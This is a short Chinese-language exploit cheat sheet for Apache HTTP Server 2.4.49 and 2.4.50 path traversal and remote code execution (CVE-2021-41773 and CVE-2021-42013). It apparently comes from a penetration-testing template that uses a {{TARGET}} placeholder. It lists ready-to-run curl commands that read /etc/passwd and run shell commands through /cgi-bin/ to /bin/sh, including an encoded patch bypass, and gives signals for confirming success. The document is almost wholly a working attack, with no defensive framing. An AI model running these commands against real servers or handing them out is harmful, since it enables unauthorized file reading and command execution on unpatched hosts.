# Apache HTTP Server 路径遍历与 RCE (CVE-2021-41773 & CVE-2021-42013)

## 指纹特征
- 服务: Apache HTTP Server 2.4.49 (CVE-2021-41773), 2.4.50 (CVE-2021-42013)
- 端口: 8080 (示例)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 路径遍历读取 | `/.%2e/%2e%2e/etc/passwd` | 无 |
| CGI 执行 RCE | `/cgi-bin/.%2e/%2e%2e/bin/sh` | 开启 CGI 模块 |

## PoC 指令

**1. 任意文件读取**
*   **CVE-2021-41773 (2.4.49)**:
    ```bash
    curl -v --path-as-is http://{{TARGET}}:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    ```
*   **CVE-2021-42013 (2.4.50 补丁绕过)**:
    ```bash
    curl -v --path-as-is http://{{TARGET}}:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
    ```

**2. 远程代码执行 (RCE)**
```bash
# 2.4.49
curl -v --data "echo;id" 'http://{{TARGET}}:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
# 2.4.50
curl -v --data "echo;id" 'http://{{TARGET}}:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```

## Success Signal
- **文件读取**: 响应 Body 包含目标文件内容。
- **RCE**: 响应 Body 包含命令执行结果（如 `uid=33(www-data)...`）。
